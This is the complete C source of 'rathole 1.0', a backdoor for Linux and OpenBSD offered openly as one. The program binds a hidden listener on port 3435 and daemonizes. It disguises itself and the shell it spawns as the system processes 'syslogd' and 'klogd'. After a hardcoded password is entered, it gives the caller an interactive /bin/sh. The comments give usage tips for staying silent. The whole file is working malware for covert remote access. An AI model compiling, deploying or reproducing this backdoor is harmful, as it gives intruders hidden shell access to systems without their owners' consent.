// rathole 1.0 - passworded backdoor for linux/openbsd - by Incognito/PT
//
// After connecting to the specified port type password and return. There are 
// no friendly error messages because it's supposed to be silent. 
// On OpenBSD /bin/sh might give you trouble. Try other shells. And If you 
// don't enjoy stderr bitching comment line 61.

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <signal.h>
#include <netinet/in.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>

#define	SHELL	"/bin/sh"		// shell to run
#define	SARG	"-i"			// shell parameters
#define	PASSWD	"foobar99"		// password (8 chars)
#define	PORT	3435			// port to bind shell
#define	FAKEPS	"syslogd"		// process fake name
#define	SHELLPS	"klogd"			// shells fake name
#define	WELCOME	"[ Rathole 1.0 ]\n\n"	// banner message

int main (int argc, char *argv[])
{
	int lsock, csock;
	struct sockaddr_in laddr, caddr;
	socklen_t len;
	pid_t pid;
	char ipass[9];
	static char *pass = PASSWD;
	static char *msg1 = WELCOME;
	char *sargv[3];
	sargv[0] = SHELLPS;
#ifdef SARG
	sargv[1] = SARG;
	sargv[2] = NULL;
#else
	sargv[1] = NULL;	
#endif
	strcpy(argv[0], FAKEPS);
	signal(SIGCHLD, SIG_IGN);
	if ((lsock = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit (-1);
	len = sizeof(laddr);
	memset(&laddr, 0, len);	
	laddr.sin_addr.s_addr = htonl(INADDR_ANY);
	laddr.sin_family = AF_INET;
	laddr.sin_port = htons(PORT);
	if (bind(lsock, (const struct sockaddr *)&laddr, len) != 0) exit (-1);
	if (listen(lsock, 1) != 0) exit (-1);
	if ((pid = fork()) == -1) exit (-1);
	if (pid > 0) exit(0);
	setsid();
	while (1) {
		if((csock = accept(lsock, (struct sockaddr *)&caddr, &len)) < 0)
			exit(-1);
		if (fork() != 0) {
			dup2(csock, 0);
			dup2(csock, 1);
			dup2(csock, 2);
			fgets(ipass, 9, stdin);
			if (strncmp(ipass, pass, 8) != 0) {
				shutdown(csock, 2);
				exit(-1);
			}
			else {
				send (csock, msg1, strlen(msg1), 0);
				execv(SHELL, sargv);
				shutdown(csock, 2);
				exit(-1);
			}
		}
		close(csock);
	}
	exit(0);
}
